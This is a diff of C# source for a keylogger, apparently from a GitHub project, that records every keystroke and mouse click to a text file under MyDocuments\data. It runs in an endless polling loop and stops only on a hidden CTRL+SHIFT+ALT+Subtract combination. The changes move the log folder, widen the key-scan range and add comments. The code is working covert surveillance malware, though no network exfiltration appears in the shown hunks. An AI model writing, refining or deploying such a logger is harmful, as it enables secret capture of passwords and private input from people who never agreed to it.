@@ -8,6 +8,11 @@ using System.Threading;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 
+/*
+ * Author: DCS77 on Github
+ * Date: 13 March 2017
+ * Description: Saves a local copy of key presses and mouse clicks in MyDocuments\data\data.txt
+ */
 
 namespace dataController {
 	class Program {
@@ -18,19 +23,22 @@ namespace dataController {
 
 		static void Main(string[] args) {
 
-			String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
+			//Output folder of key logs file. e.g. MyDocuments\data\
+			String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
 			filepath = filepath + @"\data\";
 
 			if (!Directory.Exists(filepath)) {
 				Directory.CreateDirectory(filepath);
 			}
 
+			//Output filename of key logs file.
 			string path = (@filepath + "data.txt");
 
 			if (!File.Exists(path)) {
 				using (StreamWriter sw = File.CreateText(path)) {}
 			}
 
+			//Record local computer Date and Time on startup
 			using (StreamWriter sw = File.AppendText(path)) {
 				sw.WriteLine();
 				sw.Write("♣♣♣KL1♣♣♣ " + DateTime.Now.ToString("dd/MM/yyyy h:mm:ss tt") + " ♣♣♣KL1♣♣♣");
@@ -39,23 +47,28 @@ namespace dataController {
 
 			KeysConverter converter = new KeysConverter();
 			string text = "";
-
+			
 			while (true) {
 				Thread.Sleep(20);
-				for(Int32 i = 0; i<2000; i++) {
+
+				//Increase max i if logger is skipping key presses
+				for(Int32 i = 0; i<5000; i++) {
 
 					int key = GetAsyncKeyState(i);
 
+					//If the combination of CTRL+SHIFT+ALT+Subtract keys are pressed, close the program. (Subtract is the top-right key of the numpad)
 					if (((String.Compare(text, "Subtract", false)) == 0) && ((Control.ModifierKeys & Keys.Shift) == Keys.Shift) && ((Control.ModifierKeys & Keys.Control) == Keys.Control) && ((Control.ModifierKeys & Keys.Alt) == Keys.Alt)) {
 						if (System.Windows.Forms.Application.MessageLoop) {
-							// WinForms app
+							//WinForms app
 							System.Windows.Forms.Application.Exit();
 						} else {
-							// Console app
+							//Console app
 							System.Environment.Exit(1);
 						}
 					}
 
+					//Customisable symbols and string sequences appended to the log file when each button is pressed.
+					//Else uses default string values
 					if (key == 1 || key == -32767) {
 						text = converter.ConvertToString(i);
 						using (StreamWriter sw = File.AppendText(path)) {
@@ -92,13 +105,13 @@ namespace dataController {
 								break;
 							} else if ((String.Compare(text, "LShiftKey", false)) == 0) {
 								//sw.Write(" #sl ");
-								//break;
+								break;
 							} else if ((String.Compare(text, "RShiftKey", false)) == 0) {
 								//sw.Write(" #sr ");
-								//break;
+								break;
 							} else if ((String.Compare(text, "ShiftKey", false)) == 0) {
 								//sw.Write(" #s ");
-								//break;
+								break;
 							} else if ((String.Compare(text, "Menu", false)) == 0) {
 								sw.Write("#A");
 								break;
@@ -267,6 +280,7 @@ namespace dataController {
 								}
 								break;
 							} else {
+								//Recognise other uppercase/shift keys
 								if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift) {
 									if ((String.Compare(text, "1", false)) == 0) {
 										sw.Write("!");
@@ -298,7 +312,6 @@ namespace dataController {
 								break;
 							}
 						}
-						break;
 					}
 				}
 			}
